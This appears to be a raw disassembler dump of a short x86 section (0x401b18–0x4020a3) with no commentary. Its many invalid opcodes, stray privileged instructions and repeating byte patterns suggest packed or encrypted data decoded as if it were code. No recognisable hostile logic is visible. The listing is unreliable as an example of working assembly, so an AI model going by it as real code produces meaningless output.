  401b18:	87 0f                	xchg   %ecx,(%edi)
  401b1a:	1f                   	pop    %ds
  401b1b:	f0 9c                	lock pushf
  401b1d:	9b                   	fwait
  401b1e:	08 04 d0             	or     %al,(%eax,%edx,8)
  401b21:	2f                   	das
  401b22:	74 6b                	je     0x401b8f
  401b24:	fc                   	cld
  401b25:	30 b8 67 e1 c3 04    	xor    %bh,0x4c3e167(%eax)
  401b2b:	31 00                	xor    %eax,(%eax)
  401b2d:	31 07                	xor    %eax,(%edi)
  401b2f:	3e 1c 9f             	ds sbb $0x9f,%al
  401b32:	96                   	xchg   %eax,%esi
  401b33:	2c 31                	sub    $0x31,%al
  401b35:	04 9a                	add    $0x9a,%al
  401b37:	1d 8b c2 01 38       	sbb    $0x3801c28b,%eax
  401b3c:	7b 0b                	jnp    0x401b49
  401b3e:	04 74                	add    $0x74,%al
  401b40:	6c                   	insb   (%dx),%es:(%edi)
  401b41:	e0 70                	loopne 0x401bb3
  401b43:	5a                   	pop    %edx
  401b44:	f6 0d 88 80 71 3c e1 	testb  $0xe1,0x3c718088
  401b4b:	d0 3c 76             	sarb   $1,(%esi,%esi,2)
  401b4e:	88 b4 9c b4 2e b6 8e 	mov    %dh,-0x7149d14c(%esp,%ebx,4)
  401b55:	45                   	inc    %ebp
  401b56:	db 8d 23 b2 e1 70    	fisttpl 0x70e1b223(%ebp)
  401b5c:	e8 1f d8 b4 fc       	call   0xfcf4f380
  401b61:	b4 c8                	mov    $0xc8,%ah
  401b63:	5f                   	pop    %edi
  401b64:	1c db                	sbb    $0xdb,%al
  401b66:	56                   	push   %esi
  401b67:	c2 18 b5             	ret    $0xb518
  401b6a:	38 b5 c2 e1 70 38    	cmp    %dh,0x3870e1c2(%ebp)
  401b70:	54                   	push   %esp
  401b71:	b5 7c                	mov    $0x7c,%ch
  401b73:	b5 a4                	mov    $0xa4,%ch
  401b75:	80 98 b5 94 6b 3b b5 	sbbb   $0xb5,0x3b6b94b5(%eax)
  401b7c:	97                   	xchg   %eax,%edi
  401b7d:	41                   	inc    %ecx
  401b7e:	1c ff                	sbb    $0xff,%al
  401b80:	01 d3                	add    %edx,%ebx
  401b82:	24 11                	and    $0x11,%al
  401b84:	67 10 ed             	addr16 adc %ch,%ch
  401b87:	4b                   	dec    %ebx
  401b88:	2a 11                	sub    (%ecx),%dl
  401b8a:	3f                   	aas
  401b8b:	0e                   	push   %cs
  401b8c:	c7                   	(bad)
  401b8d:	e3 44                	jecxz  0x401bd3
  401b8f:	70 5e                	jo     0x401bef
  401b91:	5c                   	pop    %esp
  401b92:	27                   	daa
  401b93:	c6                   	(bad)
  401b94:	26 0e                	es push %cs
  401b96:	dd 53 f8             	fstl   -0x8(%ebx)
  401b99:	8d b0 7c ce 70 3c    	lea    0x3c70ce7c(%eax),%esi
  401b9f:	68 8e c4 b5 3f       	push   $0x3fb5c48e
  401ba4:	3f                   	aas
  401ba5:	3b 16                	cmp    (%esi),%edx
  401ba7:	58                   	pop    %eax
  401ba8:	c9                   	leave
  401ba9:	23 7c a0 1f          	and    0x1f(%eax,%eiz,4),%edi
  401bad:	1f                   	pop    %ds
  401bae:	3f                   	aas
  401baf:	3f                   	aas
  401bb0:	c0 e4 04             	shl    $0x4,%ah
  401bb3:	ca 28 37             	lret   $0x3728
  401bb6:	9e                   	sahf
  401bb7:	9f                   	lahf
  401bb8:	9f                   	lahf
  401bb9:	4c                   	dec    %esp
  401bba:	64 84 5c fa 10       	test   %bl,%fs:0x10(%edx,%edi,8)
  401bbf:	c3                   	ret
  401bc0:	aa                   	stos   %al,%es:(%edi)
  401bc1:	fc                   	cld
  401bc2:	1e                   	push   %ds
  401bc3:	22 30                	and    (%eax),%dh
  401bc5:	df 91 d9 dc f3 a0    	fists  -0x5f0c2327(%ecx)
  401bcb:	c3                   	ret
  401bcc:	9c                   	pushf
  401bcd:	c3                   	ret
  401bce:	db 9a ff cd e5 6b    	fistpl 0x6be5cdff(%edx)
  401bd4:	3f                   	aas
  401bd5:	5e                   	pop    %esi
  401bd6:	47                   	inc    %edi
  401bd7:	df 88 48 31 38 1c    	fisttps 0x1c383148(%eax)
  401bdd:	0e                   	push   %cs
  401bde:	87 e3                	xchg   %esp,%ebx
  401be0:	31 f7                	xor    %esi,%edi
  401be2:	31 0b                	xor    %ecx,(%ebx)
  401be4:	32 1f                	xor    (%edi),%bl
  401be6:	32 33                	xor    (%ebx),%dh
  401be8:	21 cf                	and    %ecx,%edi
  401bea:	61                   	popa
  401beb:	71 32                	jno    0x401c1f
  401bed:	47                   	inc    %edi
  401bee:	5b                   	pop    %ebx
  401bef:	00 eb                	add    %ch,%bl
  401bf1:	1c c4                	sbb    $0xc4,%al
  401bf3:	af                   	scas   %es:(%edi),%eax
  401bf4:	58                   	pop    %eax
  401bf5:	2f                   	das
  401bf6:	d4 79                	aam    $0x79
  401bf8:	f5                   	cmc
  401bf9:	e1 f0                	loope  0x401beb
  401bfb:	31 00                	xor    %eax,(%eax)
  401bfd:	eb 5c                	jmp    0x401c5b
  401bff:	53                   	push   %ebx
  401c00:	8c 6b aa             	mov    %gs,-0x56(%ebx)
  401c03:	91                   	xchg   %eax,%ecx
  401c04:	3a 88 4e 39 72 9d    	cmp    -0x628dc6b2(%eax),%cl
  401c0a:	9a 7a e4 9a 53 cc 5c 	lcall  $0x5ccc,$0x539ae47a
  401c11:	e7 a7                	out    %eax,$0xa7
  401c13:	9a b9 a6 4e 39 73 4d 	lcall  $0x4d73,$0x394ea6b9
  401c1a:	12 f7                	adc    %bh,%dh
  401c1c:	92                   	xchg   %eax,%edx
  401c1d:	9a 07 3d 8f 6e 9e 10 	lcall  $0x109e,$0x6e8f3d07
  401c24:	d4 29                	aam    $0x29
  401c26:	8e ae 01 35 c9 b1    	mov    -0x4e36caff(%esi),%gs
  401c2c:	2c cd                	sub    $0xcd,%al
  401c2e:	19 cb                	sbb    %ecx,%ebx
  401c30:	e1 70                	loope  0x401ca2
  401c32:	58                   	pop    %eax
  401c33:	06                   	push   %es
  401c34:	a0 32 40 59 d0       	mov    0xd0594032,%al
  401c39:	59                   	pop    %ecx
  401c3a:	1c 0e                	sbb    $0xe,%al
  401c3c:	87 c3                	xchg   %eax,%ebx
  401c3e:	84 59 f0             	test   %bl,-0x10(%ecx)
  401c41:	99                   	cltd
  401c42:	96                   	xchg   %eax,%esi
  401c43:	11 9c 11 1f 83 70 38 	adc    %ebx,0x3870831f(%ecx,%edx,1)
  401c4a:	08 9a 64 98 7c 98    	or     %bl,-0x6783679c(%edx)
  401c50:	e3 70                	jecxz  0x401cc2
  401c52:	3c 16                	cmp    $0x16,%al
  401c54:	88 28                	mov    %ch,(%eax)
  401c56:	9a ec 35 48 e7 79 1e 	lcall  $0x1e79,$0xe74835ec
  401c5d:	c7                   	(bad)
  401c5e:	68 9a 88 a8 c4       	push   $0xc4a8889a
  401c63:	dc e7                	fsub   %st,%st(7)
  401c65:	71 38                	jno    0x401c9f
  401c67:	9e                   	sahf
  401c68:	f8                   	clc
  401c69:	18 9b 30 9b 4c 64    	sbb    %bl,0x644c9b30(%ebx)
  401c6f:	70 38                	jo     0x401ca9
  401c71:	1c 8e                	sbb    $0x8e,%al
  401c73:	a0 98 c4 96 50       	mov    0x5096c498,%al
  401c78:	91                   	xchg   %eax,%ecx
  401c79:	78 9b                	js     0x401c16
  401c7b:	90                   	nop
  401c7c:	9b                   	fwait
  401c7d:	70 3c                	jo     0x401cbb
  401c7f:	cf                   	iret
  401c80:	e3 ac                	jecxz  0x401c2e
  401c82:	c8 e8 08 9c          	enter  $0x8e8,$0x9c
  401c86:	28 9c f3 3c cf e3 50 	sub    %bl,0x50e3cf3c(%ebx,%esi,8)
  401c8d:	74 8c                	je     0x401c1b
  401c8f:	ac                   	lods   %ds:(%esi),%al
  401c90:	cc                   	int3
  401c91:	f3 38 1c cf          	repz cmp %bl,(%edi,%ecx,8)
  401c95:	e8 08 9d 24 9d       	call   0x9d64b9a2
  401c9a:	44                   	inc    %esp
  401c9b:	64 cf                	fs iret
  401c9d:	f3 3c cf             	repz cmp $0xcf,%al
  401ca0:	84 a0 c0 dc fc cf    	test   %ah,-0x30032340(%eax)
  401ca6:	f3 38 1c 1c          	repz cmp %bl,(%esp,%ebx,1)
  401caa:	9e                   	sahf
  401cab:	30 9e 4c 6c 8c 0e    	xor    %bl,0xe8c6c4c(%esi)
  401cb1:	c7                   	(bad)
  401cb2:	f3 3c a8             	repz cmp $0xa8,%al
  401cb5:	c0 e0 04             	shl    $0x4,%al
  401cb8:	9f                   	lahf
  401cb9:	1c 9f                	sbb    $0x9f,%al
  401cbb:	3c cf                	cmp    $0xcf,%al
  401cbd:	f3 3c 38             	repz cmp $0x38,%al
  401cc0:	54                   	push   %esp
  401cc1:	70 90                	jo     0x401c53
  401cc3:	ac                   	lods   %ds:(%esi),%al
  401cc4:	c4 38                	les    (%eax),%edi
  401cc6:	1c cf                	sbb    $0xcf,%al
  401cc8:	f3 d8 f8             	repz fdivr %st(0),%st
  401ccb:	10 a0 30 a0 4c f3    	adc    %ah,-0xcb35fd0(%eax)
  401cd1:	3c cf                	cmp    $0xcf,%al
  401cd3:	f3 68 84 a0 c0 d8    	repz push $0xd8c0a084
  401cd9:	f3 38 1c cf          	repz cmp %bl,(%edi,%ecx,8)
  401cdd:	f8                   	clc
  401cde:	10 a1 28 a1 44 60    	adc    %ah,0x6044a128(%ecx)
  401ce4:	cf                   	iret
  401ce5:	f3 3c cf             	repz cmp $0xcf,%al
  401ce8:	78 98                	js     0x401c82
  401cea:	b8 d4 f4 cf f3       	mov    $0xf3cff4d4,%eax
  401cef:	38 1c 1c             	cmp    %bl,(%esp,%ebx,1)
  401cf2:	a2 38 a2 50 74       	mov    %al,0x7450a238
  401cf7:	90                   	nop
  401cf8:	0e                   	push   %cs
  401cf9:	c7                   	(bad)
  401cfa:	f3 3c b0             	repz cmp $0xb0,%al
  401cfd:	d0 ec                	shr    $1,%ah
  401cff:	0c a3                	or     $0xa3,%al
  401d01:	28 a3 3c cf f3 3c    	sub    %ah,0x3cf3cf3c(%ebx)
  401d07:	48                   	dec    %eax
  401d08:	68 84 a0 bc d8       	push   $0xd8bca084
  401d0d:	3c 0e                	cmp    $0xe,%al
  401d0f:	c7                   	(bad)
  401d10:	f3 f4                	repz hlt
  401d12:	14 a4                	adc    $0xa4,%al
  401d14:	30 a4 50 70 f3 3c cf 	xor    %ah,-0x30c30c90(%eax,%edx,2)
  401d1b:	f3 90                	pause
  401d1d:	ac                   	lods   %ds:(%esi),%al
  401d1e:	c4                   	(bad)
  401d1f:	e0 fc                	loopne 0x401d1d
  401d21:	f3 3c 0e             	repz cmp $0xe,%al
  401d24:	c7                   	(bad)
  401d25:	14 a5                	adc    $0xa5,%al
  401d27:	34 a5                	xor    $0xa5,%al
  401d29:	50                   	push   %eax
  401d2a:	68 80 c7 f3 3c       	push   $0x3cf3c780
  401d2f:	cf                   	iret
  401d30:	9c                   	pushf
  401d31:	bc d8 f8 10 a6       	mov    $0xa610f8d8,%esp
  401d36:	cf                   	iret
  401d37:	f3 3c 0e             	repz cmp $0xe,%al
  401d3a:	30 a6 50 70 90 b0    	xor    %ah,-0x4f6f8fb0(%esi)
  401d40:	cf                   	iret
  401d41:	e3 70                	jecxz  0x401db3
  401d43:	3c d4                	cmp    $0xd4,%al
  401d45:	00 a7 1c a7 34 54    	add    %ah,0x5434a71c(%edi)
  401d4b:	3c cf                	cmp    $0xcf,%al
  401d4d:	f3 3c 6c             	repz cmp $0x6c,%al
  401d50:	8c a8 c8 e4 08 3c    	mov    %gs,0x3c08e4c8(%eax)
  401d56:	cf                   	iret
  401d57:	e3 70                	jecxz  0x401dc9
  401d59:	a8 34                	test   $0x34,%al
  401d5b:	a8 4c                	test   $0x4c,%al
  401d5d:	68 84 a0 70 3c       	push   $0x3c70a084
  401d62:	cf                   	iret
  401d63:	f3 c0 dc f8          	repz rcr $0xf8,%ah
  401d67:	14 a9                	adc    $0xa9,%al
  401d69:	30 a9 f3 3c cf e3    	xor    %ch,-0x1c30c30d(%ecx)
  401d6f:	4c                   	dec    %esp
  401d70:	68 7c 98 b4 e3       	push   $0xe3b4987c
  401d75:	70 3c                	jo     0x401db3
  401d77:	cf                   	iret
  401d78:	d4 f8                	aam    $0xf8
  401d7a:	14 aa                	adc    $0xaa,%al
  401d7c:	38 aa 54 cf f3 3c    	cmp    %ch,0x3cf3cf54(%edx)
  401d82:	cf                   	iret
  401d83:	68 7c 98 b0 c8       	push   $0xc8b0987c
  401d88:	cf                   	iret
  401d89:	e3 70                	jecxz  0x401dfb
  401d8b:	3c e4                	cmp    $0xe4,%al
  401d8d:	04 ab                	add    $0xab,%al
  401d8f:	1c ab                	sbb    $0xab,%al
  401d91:	38 54 3c cf          	cmp    %dl,-0x31(%esp,%edi,1)
  401d95:	f3 3c 70             	repz cmp $0x70,%al
  401d98:	8c ac c8 e0 fc 3c 8f 	mov    %gs,-0x70c30320(%eax,%ecx,8)
  401d9f:	c3                   	ret
  401da0:	f1                   	int1
  401da1:	18 ac 38 ac 58 74 94 	sbb    %ch,-0x6b8ba754(%eax,%edi,1)
  401da8:	70 3c                	jo     0x401de6
  401daa:	cf                   	iret
  401dab:	f3 b0 d0             	repz mov $0xd0,%al
  401dae:	ec                   	in     (%dx),%al
  401daf:	08 ad 20 ad f3 3c    	or     %ch,0x3cf3ad20(%ebp)
  401db5:	cf                   	iret
  401db6:	e3 3c                	jecxz  0x401df4
  401db8:	58                   	pop    %eax
  401db9:	70 90                	jo     0x401d4b
  401dbb:	ac                   	lods   %ds:(%esi),%al
  401dbc:	e3 70                	jecxz  0x401e2e
  401dbe:	3c cf                	cmp    $0xcf,%al
  401dc0:	d0 f4                	shl    $1,%ah
  401dc2:	0c ae                	or     $0xae,%al
  401dc4:	2c ae                	sub    $0xae,%al
  401dc6:	48                   	dec    %eax
  401dc7:	cf                   	iret
  401dc8:	f3 3c cf             	repz cmp $0xcf,%al
  401dcb:	68 88 a4 c0 e0       	push   $0xe0c0a488
  401dd0:	a3 f0 38 1c 00       	mov    %eax,0x1c38f0
  401dd5:	af                   	scas   %es:(%edi),%eax
  401dd6:	18 af 30 5c f6 22    	sbb    %ch,0x22f65c30(%edi)
  401ddc:	19 3f                	sbb    %edi,(%edi)
  401dde:	96                   	xchg   %eax,%esi
  401ddf:	4d                   	dec    %ebp
  401de0:	78 24                	js     0x401e06
  401de2:	c1 c3 d4             	rol    $0xd4,%ebx
  401de5:	38 a7 f2 5c 9e 95    	cmp    %ah,-0x6a61a30e(%edi)
  401deb:	61                   	popa
  401dec:	16                   	push   %ss
  401ded:	ba b9 e5 50 b7       	mov    $0xb750e5b9,%edx
  401df2:	7a 06                	jp     0x401dfa
  401df4:	4d                   	dec    %ebp
  401df5:	dc fd                	fdivr  %st,%st(5)
  401df7:	43                   	inc    %ebx
  401df8:	b2 8e                	mov    $0x8e,%dl
  401dfa:	03 bc 18 25 87 c3 50 	add    0x50c38725(%eax,%ebx,1),%edi
  401e01:	48                   	dec    %eax
  401e02:	c0 90 60 8c 65 f1 04 	rclb   $0x4,-0xe9a73a0(%eax)
  401e09:	38 62 3f             	cmp    %ah,0x3f(%edx)
  401e0c:	24 36                	and    $0x36,%al
  401e0e:	9e                   	sahf
  401e0f:	b4 0b                	mov    $0xb,%ah
  401e11:	85 ef                	test   %ebp,%edi
  401e13:	e5 c7                	in     $0xc7,%eax
  401e15:	36 57                	ss push %edi
  401e17:	2c 38                	sub    $0x38,%al
  401e19:	79 c7                	jns    0x401de2
  401e1b:	87 9f 34 38 30 0a    	xchg   %ebx,0xa303834(%edi)
  401e21:	1f                   	pop    %ds
  401e22:	8e af 53 5c 38 3c    	mov    0x3c385c53(%edi),%gs
  401e28:	a8 45                	test   $0x45,%al
  401e2a:	4f                   	dec    %edi
  401e2b:	53                   	push   %ebx
  401e2c:	05 08 33 23 8c       	add    $0x8c233308,%eax
  401e31:	31 db                	xor    %ebx,%ebx
  401e33:	68 87 3b 44 7b       	push   $0x7b443b87
  401e38:	18 95 1e 27 fb f8    	sbb    %dl,-0x704d8e2(%ebp)
  401e3e:	1e                   	push   %ds
  401e3f:	cd 31                	int    $0x31
  401e41:	c8 44 fb 71          	enter  $0xfb44,$0x71
  401e45:	48                   	dec    %eax
  401e46:	57                   	push   %edi
  401e47:	0e                   	push   %cs
  401e48:	87 43 eb             	xchg   %eax,-0x15(%ebx)
  401e4b:	04 80                	add    $0x80,%al
  401e4d:	4c                   	dec    %esp
  401e4e:	80 c4 80             	add    $0x80,%ah
  401e51:	38 dc                	cmp    %bl,%ah
  401e53:	65 18 34 81          	sbb    %dh,%gs:(%ecx,%eax,4)
  401e57:	b0 82                	mov    $0x82,%al
  401e59:	0e                   	push   %cs
  401e5a:	87 c3                	xchg   %eax,%ebx
  401e5c:	e1 bc                	loope  0x401e1a
  401e5e:	83 14 84 b0          	adcl   $0xffffffb0,(%esp,%eax,4)
  401e62:	81 a0 84 cf e3 78 1c 	andl   $0xbc85141c,0x78e3cf84(%eax)
  401e69:	14 85 bc 
  401e6c:	14 86                	adc    $0x86,%al
  401e6e:	90                   	nop
  401e6f:	fc                   	cld
  401e70:	cf                   	iret
  401e71:	e3 78                	jecxz  0x401eeb
  401e73:	1c 9c                	sbb    $0x9c,%al
  401e75:	87 f8                	xchg   %edi,%eax
  401e77:	2c 88                	sub    $0x88,%al
  401e79:	54                   	push   %esp
  401e7a:	70 87                	jo     0x401e03
  401e7c:	e3 79                	jecxz  0x401ef7
  401e7e:	1c 14                	sbb    $0x14,%al
  401e80:	89 5c ac 04          	mov    %ebx,0x4(%esp,%ebp,4)
  401e84:	8a 5c 82 9e          	mov    -0x62(%edx,%eax,4),%bl
  401e88:	c7                   	(bad)
  401e89:	f1                   	int1
  401e8a:	b8 90 8a c8 f4       	mov    $0xf4c88a90,%eax
  401e8f:	8e e7                	mov    %edi,%fs
  401e91:	71 38                	jno    0x401ecb
  401e93:	24 8b                	and    $0x8b,%al
  401e95:	48                   	dec    %eax
  401e96:	8b 78 a8             	mov    -0x58(%eax),%edi
  401e99:	e0 5f                	loopne 0x401efa
  401e9b:	cb                   	lret
  401e9c:	e9 59 1c d0 61       	jmp    0x62103afa
  401ea1:	d0 69 29             	shrb   $1,0x29(%ecx)
  401ea4:	1c 8e                	sbb    $0x8e,%al
  401ea6:	ec                   	in     (%dx),%al
  401ea7:	8b 74 84 70          	mov    0x70(%esp,%eax,4),%esi
  401eab:	7f 38                	jg     0x401ee5
  401ead:	74 2c                	je     0x401edb
  401eaf:	e6 b4                	out    %al,$0xb4
  401eb1:	7d 2c                	jge    0x401edf
  401eb3:	87 c3                	xchg   %eax,%ebx
  401eb5:	e1 70                	loope  0x401f27
  401eb7:	8c 70 8c             	mov    %?,-0x74(%eax)
  401eba:	b0 8c                	mov    $0x8c,%al
  401ebc:	d0 8c ec 8c 70 38 1c 	rorb   $1,0x1c38708c(%esp,%ebp,8)
  401ec3:	0e                   	push   %cs
  401ec4:	04 8d                	add    $0x8d,%al
  401ec6:	3c 8d                	cmp    $0x8d,%al
  401ec8:	78 8d                	js     0x401e57
  401eca:	a8 8d                	test   $0x8d,%al
  401ecc:	c0 8d 1c 8e c3 e2 dc 	rorb   $0xdc,-0x1d3c71e4(%ebp)
  401ed3:	ec                   	in     (%dx),%al
  401ed4:	7b 94                	jnp    0x401e6a
  401ed6:	66 62 cf e3          	data16 (bad) {rz-bad}
  401eda:	78 a8                	js     0x401e84
  401edc:	ac                   	lods   %ds:(%esi),%al
  401edd:	5e                   	pop    %esi
  401ede:	88 98 e2 7b 31 ef    	mov    %bl,-0x10ce841e(%eax)
  401ee4:	30 31                	xor    %dh,(%ecx)
  401ee6:	87 ef                	xchg   %ebp,%edi
  401ee8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401ee9:	b4 80                	mov    $0x80,%ah
  401eeb:	8e c7                	mov    %edi,%es
  401eed:	a1 6f 08 8e 24       	mov    0x248e086f,%eax
  401ef2:	3c 79                	cmp    $0x79,%al
  401ef4:	a3 f2 ba 14 38       	mov    %eax,0x3814baf2
  401ef9:	8e c3                	mov    %ebx,%es
  401efb:	f1                   	int1
  401efc:	38 fd                	cmp    %bh,%ch
  401efe:	84 11                	test   %dl,(%ecx)
  401f00:	2c fc                	sub    $0xfc,%al
  401f02:	df 15 e7 82 b0 36    	fists  0x36b082e7
  401f08:	41                   	inc    %ecx
  401f09:	51                   	push   %ecx
  401f0a:	70 3e                	jo     0x401f4a
  401f0c:	43                   	inc    %ebx
  401f0d:	38 d3                	cmp    %dl,%bl
  401f0f:	bc d4 f7 70 dd       	mov    $0xdd70f7d4,%esp
  401f14:	15 87 c3 e1 20       	adc    $0x20e1c387,%eax
  401f19:	c8 a8 df 9c          	enter  $0xdfa8,$0x9c
  401f1d:	ff                   	(bad)
  401f1e:	b8 42 bb 67 e6       	mov    $0xe667bb42,%eax
  401f23:	3f                   	aas
  401f24:	5e                   	pop    %esi
  401f25:	47                   	inc    %edi
  401f26:	ef                   	out    %eax,(%dx)
  401f27:	c8 84 38 38          	enter  $0x3884,$0x38
  401f2b:	1c 0e                	sbb    $0xe,%al
  401f2d:	87 1f                	xchg   %ebx,(%edi)
  401f2f:	39 33                	cmp    %esi,(%ebx)
  401f31:	39 47 39             	cmp    %eax,0x39(%edi)
  401f34:	5b                   	pop    %ebx
  401f35:	39 6f 87             	cmp    %ebp,-0x79(%edi)
  401f38:	c5 e1 70             	(bad)
  401f3b:	39 83 39 97 39 ab    	cmp    %eax,-0x54c668c7(%ebx)
  401f41:	fc                   	cld
  401f42:	9c                   	pushf
  401f43:	f2 3c bf             	repnz cmp $0xbf,%al
  401f46:	d3 00                	roll   %cl,(%eax)
  401f48:	04 0f                	add    $0xf,%al
  401f4a:	5f                   	pop    %edi
  401f4b:	fb                   	sti
  401f4c:	62 36                	bound  %esi,(%esi)
  401f4e:	18 39                	sbb    %bh,(%ecx)
  401f50:	6e                   	outsb  %ds:(%esi),(%dx)
  401f51:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f52:	ce                   	into
  401f53:	ab                   	stos   %eax,%es:(%edi)
  401f54:	c8 23 d7 35          	enter  $0xd723,$0x35
  401f58:	95                   	xchg   %eax,%ebp
  401f59:	b9 ce 85 b4 73       	mov    $0x73b485ce,%ecx
  401f5e:	4d                   	dec    %ebp
  401f5f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401f60:	1f                   	pop    %ds
  401f61:	e6 da                	out    %al,$0xda
  401f63:	4f                   	dec    %edi
  401f64:	33 cc                	xor    %esp,%ecx
  401f66:	35 9d 6e 99 6b       	xor    $0x6b996e9d,%eax
  401f6b:	3a ed                	cmp    %ch,%ch
  401f6d:	2b d7                	sub    %edi,%edx
  401f6f:	74 fa                	je     0x401f6b
  401f71:	56                   	push   %esi
  401f72:	ae                   	scas   %es:(%edi),%al
  401f73:	e9 34 ae 5c d3       	jmp    0xd39ccdac
  401f78:	e9 8e bb 17 d3       	jmp    0xd357db0b
  401f7d:	04 4c                	add    $0x4c,%al
  401f7f:	e9 71 ec 80 48       	jmp    0x48c10bf5
  401f84:	b0 26                	mov    $0x26,%al
  401f86:	1d 87 a8 34 3b       	sbb    $0x3b34a887,%eax
  401f8b:	1a df                	sbb    %bh,%bl
  401f8d:	0a df                	or     %bh,%bl
  401f8f:	84 58 1c             	test   %bl,0x1c(%eax)
  401f92:	3a df                	cmp    %bh,%bl
  401f94:	51                   	push   %ecx
  401f95:	6c                   	insb   (%dx),%es:(%edi)
  401f96:	5e                   	pop    %esi
  401f97:	f4                   	hlt
  401f98:	10 c7                	adc    %al,%bh
  401f9a:	96                   	xchg   %eax,%esi
  401f9b:	81 86 1c 57 70 57 24 	addl   $0xc4d3624,0x5770571c(%esi)
  401fa2:	36 4d 0c 
  401fa5:	b8 56 84 8e 4b       	mov    $0x4b8e8456,%eax
  401faa:	86 c3                	xchg   %al,%bl
  401fac:	fb                   	sti
  401fad:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401fae:	8e 38                	mov    (%eax),%?
  401fb0:	8f                   	(bad)
  401fb1:	f1                   	int1
  401fb2:	3c 96                	cmp    $0x96,%al
  401fb4:	1d 8c f8 14 90       	sbb    $0x9014f88c,%eax
  401fb9:	1c 0e                	sbb    $0xe,%al
  401fbb:	87 c3                	xchg   %eax,%ebx
  401fbd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401fbe:	90                   	nop
  401fbf:	70 91                	jo     0x401f52
  401fc1:	10 92 1c 3c f3 d4    	adc    %dl,-0x2b0cc3e4(%edx)
  401fc7:	e3 78                	jecxz  0x402041
  401fc9:	1c 34                	sbb    $0x34,%al
  401fcb:	92                   	xchg   %eax,%edx
  401fcc:	50                   	push   %eax
  401fcd:	38 7e 8b             	cmp    %bh,-0x75(%esi)
  401fd0:	43                   	inc    %ebx
  401fd1:	7c 92                	jl     0x401f65
  401fd3:	38 40 93             	cmp    %al,-0x6d(%eax)
  401fd6:	2c d6                	sub    $0xd6,%al
  401fd8:	cb                   	lret
  401fd9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401fda:	70 93                	jo     0x401f6f
  401fdc:	10 3c e2             	adc    %bh,(%edx,%eiz,8)
  401fdf:	d0 7d 93             	sarb   $1,-0x6d(%ebp)
  401fe2:	50                   	push   %eax
  401fe3:	8f 40 39             	pop    0x39(%eax)
  401fe6:	2d 93 df 6c 1e       	sub    $0x1e6cdf93,%eax
  401feb:	87 c3                	xchg   %eax,%ebx
  401fed:	71 50                	jno    0x40203f
  401fef:	93                   	xchg   %eax,%ebx
  401ff0:	90                   	nop
  401ff1:	93                   	xchg   %eax,%ebx
  401ff2:	ac                   	lods   %ds:(%esi),%al
  401ff3:	93                   	xchg   %eax,%ebx
  401ff4:	e8 0e c7 f3 38       	call   0x3933e707
  401ff9:	d8 67 d8             	fsubs  -0x28(%edi)
  401ffc:	c8 24 94 04          	enter  $0x9424,$0x4
  402000:	94                   	xchg   %eax,%esp
  402001:	9e                   	sahf
  402002:	e7 79                	out    %eax,$0x79
  402004:	1c 60                	sbb    $0x60,%al
  402006:	94                   	xchg   %eax,%esp
  402007:	54                   	push   %esp
  402008:	40                   	inc    %eax
  402009:	80 9c 87 c3 e1 78 fc 	sbbb   $0xc,-0x3871e3d(%edi,%eax,4)
  402010:	0c 
  402011:	95                   	xchg   %eax,%ebp
  402012:	6c                   	insb   (%dx),%es:(%edi)
  402013:	95                   	xchg   %eax,%ebp
  402014:	cc                   	int3
  402015:	95                   	xchg   %eax,%ebp
  402016:	2c 96                	sub    $0x96,%al
  402018:	e1 78                	loope  0x402092
  40201a:	1c 0e                	sbb    $0xe,%al
  40201c:	44                   	inc    %esp
  40201d:	96                   	xchg   %eax,%esi
  40201e:	64 96                	fs xchg %eax,%esi
  402020:	dc 60 97             	fsubl  -0x69(%eax)
  402023:	e4 97                	in     $0x97,%al
  402025:	0a 0e                	or     (%esi),%cl
  402027:	87 c3                	xchg   %eax,%ebx
  402029:	b8 98 3c 99 c0       	mov    $0xc0993c98,%eax
  40202e:	99                   	cltd
  40202f:	ff 0a                	decl   (%edx)
  402031:	0c 0c                	or     $0xc,%al
  402033:	c8 8a d5 2f          	enter  $0xd58a,$0x2f
  402037:	78 13                	js     0x40204c
  402039:	1b 0b                	sbb    (%ebx),%ecx
  40203b:	c7                   	(bad)
  40203c:	22 19                	and    (%ecx),%bl
  40203e:	43                   	inc    %ebx
  40203f:	04 78                	add    $0x78,%al
  402041:	38 e7                	cmp    %ah,%bh
  402043:	8d 49 5c             	lea    0x5c(%ecx),%ecx
  402046:	da cd                	fcmove %st(5),%st
  402048:	cc                   	int3
  402049:	87 c3                	xchg   %eax,%ebx
  40204b:	e1 70                	loope  0x4020bd
  40204d:	ce                   	into
  40204e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40204f:	bd 90 c1 54 bf       	mov    $0xbf54c190,%ebp
  402054:	a8 c0                	test   $0xc0,%al
  402056:	7b 38                	jnp    0x402090
  402058:	1c 0e                	sbb    $0xe,%al
  40205a:	e8 be f8 c3 10       	call   0x1104191d
  40205f:	be 34 c0 70 38       	mov    $0x3870c034,%esi
  402064:	1c 8f                	sbb    $0x8f,%al
  402066:	f4                   	hlt
  402067:	ca 78 c4             	lret   $0xc478
  40206a:	78 c2                	js     0x40202e
  40206c:	f4                   	hlt
  40206d:	c5 0e                	lds    (%esi),%ecx
  40206f:	c7                   	(bad)
  402070:	b2 e0                	mov    $0xe0,%dl
  402072:	14 45                	adc    $0x45,%al
  402074:	41                   	inc    %ecx
  402075:	c6                   	(bad)
  402076:	5c                   	pop    %esp
  402077:	ca c3 b3             	lret   $0xb3c3
  40207a:	bc 17 8c cb 4c       	mov    $0x4ccb8c17,%esp
  40207f:	2c c9                	sub    $0xc9,%al
  402081:	38 1c 0e             	cmp    %bl,(%esi,%ecx,1)
  402084:	87 68 d9             	xchg   %ebp,-0x27(%eax)
  402087:	70 c5                	jo     0x40204e
  402089:	10 10                	adc    %dl,(%eax)
  40208b:	90                   	nop
  40208c:	e5 30                	in     $0x30,%eax
  40208e:	87 c3                	xchg   %eax,%ebx
  402090:	e1 58                	loope  0x4020ea
  402092:	01 f8                	add    %edi,%eax
  402094:	ec                   	in     (%dx),%al
  402095:	a0 08 70 ef 70       	mov    0x70ef7008,%al
  40209a:	38 1c 0e             	cmp    %bl,(%esi,%ecx,1)
  40209d:	fc                   	cld
  40209e:	1f                   	pop    %ds
  40209f:	34 ee                	xor    $0xee,%al
  4020a1:	7c 0a                	jl     0x4020ad
  4020a3:	bc eb 0c 03 0e       	mov    $0xe030ceb,%esp
